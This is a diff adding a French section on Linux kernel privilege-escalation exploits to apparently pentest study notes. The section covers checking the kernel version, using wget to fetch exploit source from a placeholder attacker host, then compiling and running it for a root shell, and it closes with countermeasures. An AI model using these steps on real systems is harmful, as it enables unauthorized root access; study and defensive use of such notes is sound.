@@ -1206,6 +1206,67 @@ Accès root via session tmux détachable.
 
 ---
 
+# Kernel Exploits
+
+## 1) Principe
+Les **kernel exploits** ciblent des vulnérabilités dans le noyau Linux pour exécuter du code avec les **droits root**.  
+Exemples connus :  
+- **Dirty COW** (CVE-2016-5195)  
+- **Dirty Pipe** (CVE-2022-0847)  
+- **OverlayFS** (CVE-2021-3493)  
+
+⚠️ Ces exploits peuvent provoquer des crashs — à éviter sur systèmes de prod.
+
+
+## 2) Identifier la version vulnérable
+```bash
+uname -a
+cat /etc/lsb-release
+```
+
+### Exemple :
+```
+Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018
+Ubuntu 16.04.4 LTS
+```
+
+→ Rechercher ensuite :  
+`linux 4.4.0-116 exploit github`  
+ou via [https://www.exploit-db.com](https://www.exploit-db.com)
+
+## 3) Exploitation typique
+Télécharger l’exploit sur la machine cible :
+```bash
+wget http://<attacker_ip>/kernel_exploit.c
+```
+
+Compiler et rendre exécutable :
+```bash
+gcc kernel_exploit.c -o kernel_exploit
+chmod +x kernel_exploit
+```
+
+Exécuter :
+```bash
+./kernel_exploit
+# → spawning root shell
+```
+
+Vérifier :
+```bash
+whoami
+# root
+```
+
+✅ Shell root via vulnérabilité noyau.
+
+## 4) Contremesures
+- Mettre à jour le noyau (`apt update && apt upgrade`).  
+- Activer les **patchs de sécurité automatiques**.  
+- Restreindre l’accès aux outils de compilation (gcc).  
+- Utiliser **AppArmor** ou **SELinux** pour limiter l’impact d’un exploit réussi.  
+
+---
 
 
 
